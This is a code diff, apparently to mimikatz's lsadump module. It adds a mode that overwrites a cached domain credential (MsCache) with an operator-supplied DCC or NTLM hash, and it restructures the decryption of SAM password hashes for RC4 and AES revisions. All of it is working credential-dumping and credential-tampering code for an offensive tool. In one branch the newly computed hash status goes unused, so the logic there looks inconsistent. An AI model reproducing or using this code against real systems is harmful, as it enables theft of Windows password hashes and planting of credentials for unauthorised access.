@@ -103,7 +103,6 @@ NTSTATUS kuhl_m_lsadump_secretsOrCache(int argc, wchar_t * argv[], BOOL secretsO
 	PKULL_M_REGISTRY_HANDLE hSystem, hSecurity;
 	HKEY hSystemBase, hSecurityBase;
 	BYTE sysKey[SYSKEY_LENGTH];
-	BOOL hashStatus = FALSE;
 	LPCWSTR szSystem = NULL, szSecurity = NULL, szHash, szPassword, szSubject;
 	UNICODE_STRING uPassword;
 	KUHL_LSADUMP_DCC_CACHE_DATA cacheData = {0};
@@ -118,26 +117,40 @@ NTSTATUS kuhl_m_lsadump_secretsOrCache(int argc, wchar_t * argv[], BOOL secretsO
 		{
 			kprintf(L"> User cache replace mode !\n");
 			kprintf(L"  * user     : %s\n", cacheData.username);
-			if(kull_m_string_args_byName(argc, argv, L"ntlm", &szHash, NULL))
+			
+			if(kull_m_string_args_byName(argc, argv, L"dcc", &szHash, NULL))
 			{
-				hashStatus = kull_m_string_stringToHex(szHash, cacheData.ntlm, LM_NTLM_HASH_LENGTH);
-				if(!hashStatus)
-					PRINT_ERROR(L"ntlm hash length must be 32 (16 bytes) - will use default password...\n");
+				if(cacheData.isDCC = kull_m_string_stringToHex(szHash, cacheData.dcc, LM_NTLM_HASH_LENGTH))
+				{
+					kprintf(L"  * dccX     : ");
+					kull_m_string_wprintf_hex(cacheData.dcc, LM_NTLM_HASH_LENGTH, 0);
+					kprintf(L"\n");
+				}
+				else PRINT_ERROR(L"DCC hash length must be 32 (16 bytes) - will use default password...\n");
 			}
-			if(!hashStatus)
+			else
 			{
-				kull_m_string_args_byName(argc, argv, L"password", &szPassword, MIMIKATZ);
-				kprintf(L"  * password : %s\n", szPassword);
-				RtlInitUnicodeString(&uPassword, szPassword);
-				hashStatus = NT_SUCCESS(RtlDigestNTLM(&uPassword, cacheData.ntlm));
+				if(kull_m_string_args_byName(argc, argv, L"ntlm", &szHash, NULL))
+				{
+					cacheData.isNtlm = kull_m_string_stringToHex(szHash, cacheData.ntlm, LM_NTLM_HASH_LENGTH);
+					if(!cacheData.isNtlm)
+						PRINT_ERROR(L"ntlm hash length must be 32 (16 bytes) - will use default password...\n");
+				}
+				if(!cacheData.isNtlm)
+				{
+					kull_m_string_args_byName(argc, argv, L"password", &szPassword, MIMIKATZ);
+					kprintf(L"  * password : %s\n", szPassword);
+					RtlInitUnicodeString(&uPassword, szPassword);
+					cacheData.isNtlm = NT_SUCCESS(RtlDigestNTLM(&uPassword, cacheData.ntlm));
+				}
+				if(cacheData.isNtlm)
+				{
+					kprintf(L"  * ntlm     : ");
+					kull_m_string_wprintf_hex(cacheData.ntlm, LM_NTLM_HASH_LENGTH, 0);
+					kprintf(L"\n");
+				}
+				else cacheData.username = NULL;
 			}
-			if(hashStatus)
-			{
-				kprintf(L"  * ntlm     : ");
-				kull_m_string_wprintf_hex(cacheData.ntlm, LM_NTLM_HASH_LENGTH, 0);
-				kprintf(L"\n");
-			}
-			else cacheData.username = NULL;
 			kprintf(L"\n");
 		}
 		else if(kull_m_string_args_byName(argc, argv, L"subject", &szSubject, NULL))
@@ -399,62 +412,43 @@ BOOL kuhl_m_lsadump_getHash(PSAM_SENTRY pSamHash, LPCBYTE pStartOfData, LPCBYTE 
 	
 	if(pSamHash->offset)
 	{
-		//if(pSamHash->lenght == LM_NTLM_HASH_LENGTH)
-		//{
-		//	MD5Init(&md5ctx);
-		//	MD5Update(&md5ctx, samKey, SAM_KEY_DATA_KEY_LENGTH);
-		//	MD5Update(&md5ctx, &rid, sizeof(DWORD));
-		//	MD5Update(&md5ctx, isNtlm ? (isHistory ? kuhl_m_lsadump_NTPASSWORDHISTORY : kuhl_m_lsadump_NTPASSWORD) : (isHistory ? kuhl_m_lsadump_LMPASSWORDHISTORY : kuhl_m_lsadump_LMPASSWORD), isNtlm ? (isHistory ? sizeof(kuhl_m_lsadump_NTPASSWORDHISTORY) : sizeof(kuhl_m_lsadump_NTPASSWORD)) : (isHistory ? sizeof(kuhl_m_lsadump_LMPASSWORDHISTORY) : sizeof(kuhl_m_lsadump_LMPASSWORD)));
-		//	MD5Final(&md5ctx);
-		//	cypheredHashBuffer.Length = cypheredHashBuffer.MaximumLength = pSamHash->lenght - FIELD_OFFSET(SAM_HASH, data);
-		//	if(cypheredHashBuffer.Buffer = (PBYTE) LocalAlloc(LPTR, cypheredHashBuffer.Length))
-		//	{
-		//		RtlCopyMemory(cypheredHashBuffer.Buffer, pHash, cypheredHashBuffer.Length);
-		//		if(!(status = NT_SUCCESS(RtlEncryptDecryptRC4(&cypheredHashBuffer, &keyBuffer))))
-		//			PRINT_ERROR(L"RtlEncryptDecryptRC4\n");
-		//	}
-		//}
-		//else
+		switch(pHash->Revision)
 		{
-
-			switch(pHash->Revision)
+		case 1:
+			if(pSamHash->lenght >= sizeof(SAM_HASH))
 			{
-			case 1:
-				if(pSamHash->lenght >= sizeof(SAM_HASH))
+				MD5Init(&md5ctx);
+				MD5Update(&md5ctx, samKey, SAM_KEY_DATA_KEY_LENGTH);
+				MD5Update(&md5ctx, &rid, sizeof(DWORD));
+				MD5Update(&md5ctx, isNtlm ? (isHistory ? kuhl_m_lsadump_NTPASSWORDHISTORY : kuhl_m_lsadump_NTPASSWORD) : (isHistory ? kuhl_m_lsadump_LMPASSWORDHISTORY : kuhl_m_lsadump_LMPASSWORD), isNtlm ? (isHistory ? sizeof(kuhl_m_lsadump_NTPASSWORDHISTORY) : sizeof(kuhl_m_lsadump_NTPASSWORD)) : (isHistory ? sizeof(kuhl_m_lsadump_LMPASSWORDHISTORY) : sizeof(kuhl_m_lsadump_LMPASSWORD)));
+				MD5Final(&md5ctx);
+				cypheredHashBuffer.Length = cypheredHashBuffer.MaximumLength = pSamHash->lenght - FIELD_OFFSET(SAM_HASH, data);
+				if(cypheredHashBuffer.Buffer = (PBYTE) LocalAlloc(LPTR, cypheredHashBuffer.Length))
 				{
-					MD5Init(&md5ctx);
-					MD5Update(&md5ctx, samKey, SAM_KEY_DATA_KEY_LENGTH);
-					MD5Update(&md5ctx, &rid, sizeof(DWORD));
-					MD5Update(&md5ctx, isNtlm ? (isHistory ? kuhl_m_lsadump_NTPASSWORDHISTORY : kuhl_m_lsadump_NTPASSWORD) : (isHistory ? kuhl_m_lsadump_LMPASSWORDHISTORY : kuhl_m_lsadump_LMPASSWORD), isNtlm ? (isHistory ? sizeof(kuhl_m_lsadump_NTPASSWORDHISTORY) : sizeof(kuhl_m_lsadump_NTPASSWORD)) : (isHistory ? sizeof(kuhl_m_lsadump_LMPASSWORDHISTORY) : sizeof(kuhl_m_lsadump_LMPASSWORD)));
-					MD5Final(&md5ctx);
-					cypheredHashBuffer.Length = cypheredHashBuffer.MaximumLength = pSamHash->lenght - FIELD_OFFSET(SAM_HASH, data);
+					RtlCopyMemory(cypheredHashBuffer.Buffer, pHash->data, cypheredHashBuffer.Length);
+					if(!(status = NT_SUCCESS(RtlEncryptDecryptRC4(&cypheredHashBuffer, &keyBuffer))))
+						PRINT_ERROR(L"RtlEncryptDecryptRC4\n");
+				}
+			}
+			break;
+		case 2:
+			pHashAes = (PSAM_HASH_AES) pHash;
+			if(pHashAes->dataOffset >= SAM_KEY_DATA_SALT_LENGTH)
+			{
+				if(kull_m_crypto_genericAES128Decrypt(samKey, pHashAes->Salt, pHashAes->data, pSamHash->lenght - FIELD_OFFSET(SAM_HASH_AES, data), &out, &len))
+				{
+					cypheredHashBuffer.Length = cypheredHashBuffer.MaximumLength = len;
 					if(cypheredHashBuffer.Buffer = (PBYTE) LocalAlloc(LPTR, cypheredHashBuffer.Length))
 					{
-						RtlCopyMemory(cypheredHashBuffer.Buffer, pHash->data, cypheredHashBuffer.Length);
-						if(!(status = NT_SUCCESS(RtlEncryptDecryptRC4(&cypheredHashBuffer, &keyBuffer))))
-							PRINT_ERROR(L"RtlEncryptDecryptRC4\n");
+						RtlCopyMemory(cypheredHashBuffer.Buffer, out, len);
+						status = TRUE;
 					}
+					LocalFree(out);
 				}
-				break;
-			case 2:
-				pHashAes = (PSAM_HASH_AES) pHash;
-				if(pHashAes->dataOffset >= SAM_KEY_DATA_SALT_LENGTH)
-				{
-					if(kull_m_crypto_genericAES128Decrypt(samKey, pHashAes->Salt, pHashAes->data, pSamHash->lenght - FIELD_OFFSET(SAM_HASH_AES, data), &out, &len))
-					{
-						cypheredHashBuffer.Length = cypheredHashBuffer.MaximumLength = len;
-						if(cypheredHashBuffer.Buffer = (PBYTE) LocalAlloc(LPTR, cypheredHashBuffer.Length))
-						{
-							RtlCopyMemory(cypheredHashBuffer.Buffer, out, len);
-							status = TRUE;
-						}
-						LocalFree(out);
-					}
-				}
-				break;
-			default:
-				PRINT_ERROR(L"Unknow SAM_HASH revision (%hu)\n", pHash->Revision);
 			}
+			break;
+		default:
+			PRINT_ERROR(L"Unknow SAM_HASH revision (%hu)\n", pHash->Revision);
 		}
 		if(status)
 			kuhl_m_lsadump_dcsync_decrypt(cypheredHashBuffer.Buffer, cypheredHashBuffer.Length, rid, isNtlm ? (isHistory ? L"ntlm" : L"NTLM" ) : (isHistory ? L"lm  " : L"LM  "), isHistory);
@@ -705,7 +699,7 @@ BOOL kuhl_m_lsadump_getSecrets(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hPo
 
 BOOL kuhl_m_lsadump_getNLKMSecretAndCache(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hPolicyBase, IN HKEY hSecurityBase, PNT6_SYSTEM_KEYS lsaKeysStream, PNT5_SYSTEM_KEY lsaKeyUnique, IN PKUHL_LSADUMP_DCC_CACHE_DATA pCacheData)
 {
-	BOOL status = FALSE;
+	BOOL status = FALSE, hashStatus;
 	HKEY hCache;
 	DWORD i, iter = 10240, szNLKM, type, nbValues, szMaxValueNameLen, szMaxValueLen, szSecretName, szSecret, szNeeded, s1;
 	PVOID pNLKM;
@@ -769,7 +763,15 @@ BOOL kuhl_m_lsadump_getNLKMSecretAndCache(IN PKULL_M_REGISTRY_HANDLE hSecurity, 
 										if(pCacheData && pCacheData->username && (_wcsnicmp(pCacheData->username, usr.Buffer, usr.Length / sizeof(wchar_t)) == 0))
 										{
 											kprintf(L"> User cache replace mode (2)!\n");
-											if(NT_SUCCESS(kull_m_crypto_get_dcc(((PMSCACHE_DATA) pMsCacheEntry->enc_data)->mshashdata, pCacheData->ntlm, &usr, iter)))
+											if(pCacheData->isNtlm)
+												hashStatus = NT_SUCCESS(kull_m_crypto_get_dcc(((PMSCACHE_DATA) pMsCacheEntry->enc_data)->mshashdata, pCacheData->ntlm, &usr, iter));
+											else if(pCacheData->isDCC)
+											{
+												hashStatus = TRUE;
+												RtlCopyMemory(((PMSCACHE_DATA) pMsCacheEntry->enc_data)->mshashdata, pCacheData->dcc, LM_NTLM_HASH_LENGTH);
+											}
+											else hashStatus = FALSE;
+											if(hashStatus)
 											{
 												kprintf(L"  MsCacheV2 : "); kull_m_string_wprintf_hex(((PMSCACHE_DATA) pMsCacheEntry->enc_data)->mshashdata, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
 												if(kull_m_crypto_hmac(CALG_SHA1, pNLKM, AES_128_KEY_SIZE, pMsCacheEntry->enc_data, s1, pMsCacheEntry->cksum, MD5_DIGEST_LENGTH))
@@ -783,6 +785,7 @@ BOOL kuhl_m_lsadump_getNLKMSecretAndCache(IN PKULL_M_REGISTRY_HANDLE hSecurity, 
 													}
 												}
 											}
+											else PRINT_ERROR_AUTO(L"?");
 										}
 									}
 								}
@@ -801,6 +804,14 @@ BOOL kuhl_m_lsadump_getNLKMSecretAndCache(IN PKULL_M_REGISTRY_HANDLE hSecurity, 
 											if(pCacheData && pCacheData->username && (_wcsnicmp(pCacheData->username, usr.Buffer, usr.Length / sizeof(wchar_t)) == 0))
 											{
 												kprintf(L"> User cache replace mode (1)!\n");
+												if(pCacheData->isNtlm)
+													hashStatus = NT_SUCCESS(kull_m_crypto_get_dcc(((PMSCACHE_DATA) pMsCacheEntry->enc_data)->mshashdata, pCacheData->ntlm, &usr, 0));
+												else if(pCacheData->isDCC)
+												{
+													hashStatus = TRUE;
+													RtlCopyMemory(((PMSCACHE_DATA) pMsCacheEntry->enc_data)->mshashdata, pCacheData->dcc, LM_NTLM_HASH_LENGTH);
+												}
+												else hashStatus = FALSE;
 												if(NT_SUCCESS(kull_m_crypto_get_dcc(((PMSCACHE_DATA) pMsCacheEntry->enc_data)->mshashdata, pCacheData->ntlm, &usr, 0)))
 												{
 													kprintf(L"  MsCacheV1 : "); kull_m_string_wprintf_hex(((PMSCACHE_DATA) pMsCacheEntry->enc_data)->mshashdata, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
